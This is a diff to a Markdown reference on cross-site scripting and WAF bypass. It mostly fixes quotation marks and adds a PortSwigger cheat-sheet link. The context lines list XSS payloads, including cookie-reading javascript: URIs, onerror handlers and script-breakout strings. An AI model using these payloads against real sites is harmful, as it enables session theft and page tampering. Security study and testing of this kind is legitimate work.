@@ -1014,7 +1014,7 @@ Here are all the possible combinations of the character `\<` in HTML and JavaScr
 
 #### Stored XSS
 
-If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.
+If an attacker managed to push XSS through the filter, WAF wouldn't be able to prevent the attack conduction.
 
 #### Reflected XSS in JavaScript
 
@@ -1082,7 +1082,7 @@ This request will pass through the WAF and an XSS attack will be conducted in ce
 - `<Input value = "XSS" type = text>`
 - `<applet code="javascript:confirm(document.cookie);">`
 - `<isindex x="javascript:" onmouseover="alert(XSS)">`
-- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
+- `"></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
 - `"><img src="x:x" onerror="alert(XSS)">`
 - `"><iframe src="javascript:alert(XSS)">`
 - `<object data="javascript:alert(XSS)">`
@@ -1141,3 +1141,4 @@ The payload should include leading and trailing backticks:
 
 - [MDN: Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
 - [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
+- [PortSwigger: Cross-Site Scripting (XSS) Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
